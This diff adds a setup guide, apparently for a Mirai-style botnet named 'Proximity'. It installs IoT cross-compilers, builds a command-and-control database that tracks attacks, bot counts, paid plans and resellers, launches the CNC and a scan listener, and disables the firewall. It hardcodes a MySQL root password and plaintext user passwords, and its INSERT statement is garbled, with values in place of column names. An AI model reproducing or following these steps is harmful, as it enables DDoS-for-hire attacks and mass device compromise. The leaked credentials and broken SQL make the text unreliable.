@@ -1,0 +1,303 @@
+//Priority On Top
+----------------------------------------------------------
+
+Install Depencies:
+
+yum update -y
+yum install wget -y
+yum install golang -y
+yum install dos2unix -y
+yum install screen -y
+yum install ntp -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+rm -rf /usr/local/go
+wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz
+sha256sum go1.10.3.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz
+export PATH=$PATH:/usr/local/go/bin
+source ~/.bash_profile
+rm -rf go1.10.3.linux-amd64.tar.gz
+mkdir /etc/xcompile
+cd /etc/xcompile
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv6l.tar.bz2
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+rm -rf *.tar.bz2
+mv cross-compiler-i586 i586
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+rm -rf /usr/local/go
+cd /tmp
+wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz -q --no-check-certificate -c
+tar -xzf go1.13.linux-amd64.tar.gz
+mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+
+----------------------------------------------------------
+
+Install MySQL:
+
+service mysqld start; mysql_secure_installation
+
+----------------------------------------------------------
+
+Create Database:
+
+mysql -u root -pY87g6YUBVIiubnUFYT
+CREATE DATABASE Proximity;
+USE Proximity;
+
+SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
+SET AUTOCOMMIT = 0;
+START TRANSACTION;
+SET time_zone = "+00:00";
+
+--
+-- Database: `Proximity`
+--
+
+--
+-- Table structure for table `history`
+--
+
+CREATE TABLE `history` (
+  `id` int(10) UNSIGNED NOT NULL,
+  `user_id` int(10) UNSIGNED NOT NULL,
+  `time_sent` int(10) UNSIGNED NOT NULL,
+  `duration` int(10) UNSIGNED NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1'
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+--
+-- Table structure for table `logins`
+--
+
+CREATE TABLE `logins` (
+  `id` int(11) NOT NULL,
+  `username` varchar(32) NOT NULL,
+  `action` varchar(32) NOT NULL,
+  `ip` varchar(15) NOT NULL,
+  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+--
+-- Table structure for table `messages`
+--
+
+CREATE TABLE `messages` (
+  `id` int(11) NOT NULL,
+  `to` int(11) NOT NULL,
+  `from` int(11) NOT NULL,
+  `subject` varchar(40) NOT NULL,
+  `content` varchar(500) NOT NULL,
+  `seen` tinyint(4) NOT NULL DEFAULT '0',
+  `created` bigint(20) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+--
+-- Table structure for table `users`
+--
+
+CREATE TABLE `users` (
+  `id` int(10) UNSIGNED NOT NULL,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) UNSIGNED DEFAULT NULL,
+  `cooldown` int(10) UNSIGNED NOT NULL,
+  `wrc` int(10) UNSIGNED DEFAULT NULL,
+  `last_paid` int(10) UNSIGNED NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) UNSIGNED DEFAULT '0',
+  `intvl` int(10) UNSIGNED DEFAULT '30',
+  `api_key` text,
+  `mfaSecret` varchar(200) NOT NULL,
+  `planExpire` bigint(20) NOT NULL,
+  `tempban` bigint(20) NOT NULL,
+  `reseller` tinyint(1) NOT NULL DEFAULT '0',
+  `starter` tinyint(1) NOT NULL DEFAULT '0',
+  `subordinates` varchar(2000) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+--
+-- Dumping data for table `users`
+--
+
+INSERT INTO `users` (`id`, `root`, `root`, `3600`, `1`, `20`, `10/29/2020`, `100000`, `admin`, `intvl`, `root`, `mfaSecret`, `1/1/2099`, `tempban`, `reseller`, `starter`, `subordinates`) VALUES
+(1, 'mips', 'RKGIPriority61025%', 300, 10, 0, 0, -1, 1, 30, '', '', 9999999999, 0, 1, ''),
+(2, 'trap', 'TrapDowned37!', 300, 10, 0, 0, -1, 1, 30, '', '', 9999999999, 0, 1, ''),
+(3, 'Kevin', 'L/Xd8*9#Fu;AT}W8k${', 300, 10, 0, 0, -1, 0, 30, '', '', 9999999999, 0, 1, ''),
+(4, 'Tendies', 'kJzXf@Q<A92kYVtXhrE', 300, 10, 0, 0, -1, 0, 30, '', '', 9999999999, 0, 1, ''),
+(5, 'vmfe', '+2%CZN^2cE;&5h-Tn:&', 300, 10, 0, 0, -1, 0, 30, '', '', 9999999999, 0, 1, ''),
+(6, 'Revxmped', 'L9d]%Q{&n<b)NHS[ACwt', 300, 10, 0, 0, -1, 0, 30, '', '', 9999999999, 0, 1, '');
+
+--
+-- Table structure for table `whitelist`
+--
+
+CREATE TABLE `whitelist` (
+  `id` int(10) UNSIGNED NOT NULL,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) UNSIGNED DEFAULT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+--
+-- Indexes for dumped tables
+--
+
+--
+-- Indexes for table `history`
+--
+ALTER TABLE `history`
+  ADD PRIMARY KEY (`id`),
+  ADD KEY `user_id` (`user_id`);
+
+--
+-- Indexes for table `users`
+--
+ALTER TABLE `users`
+  ADD PRIMARY KEY (`id`),
+  ADD KEY `username` (`username`);
+
+--
+-- Indexes for table `whitelist`
+--
+ALTER TABLE `whitelist`
+  ADD PRIMARY KEY (`id`),
+  ADD KEY `prefix` (`prefix`);
+
+--
+-- AUTO_INCREMENT for dumped tables
+--
+
+--
+-- AUTO_INCREMENT for table `history`
+--
+ALTER TABLE `history`
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
+
+--
+-- AUTO_INCREMENT for table `users`
+--
+ALTER TABLE `users`
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
+
+--
+-- AUTO_INCREMENT for table `messages`
+--
+
+ALTER TABLE `messages`
+  ADD PRIMARY KEY (`id`);
+
+--
+-- AUTO_INCREMENT for dumped tables
+--
+
+--
+-- AUTO_INCREMENT for table `messages`
+--
+ALTER TABLE `messages`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+COMMIT;
+--
+-- AUTO_INCREMENT for table `whitelist`
+--
+ALTER TABLE `whitelist`
+  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;
+COMMIT;
+EXIT;
+
+----------------------------------------------------------
+
+Service Restart:
+
+service iptables stop; service httpd restart; service mysqld restart
+
+----------------------------------------------------------
+
+Build Command:
+
+cd ~/; chmod 0777 * -R; sh build.sh
+
+----------------------------------------------------------
+
+Change Ulimit:
+
+nano /usr/include/bits/typesizes.h
+
+----------------------------------------------------------
+
+Ulimit Everything:
+
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+----------------------------------------------------------
+
+Screen CNC:
+
+screen python auto.py
+
+----------------------------------------------------------
+
+Screen ScanListen:
+
+cd loader; screen -s scanListen ./scanListen
+
+----------------------------------------------------------
+
+Ulimit Everything:
+
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+----------------------------------------------------------
+
+PHPMyAdmin:
+
+yum update -y
+yum install httpd php wget nano -y
+service iptables stop
+chkconfig iptables off
+sudo yum install epel-release -y
+yum update
+yum install httpd mysql-server php  -y
+service mysql start
+yum install php
+yum install phpmyadmin -y
+
+----------------------------------------------------------
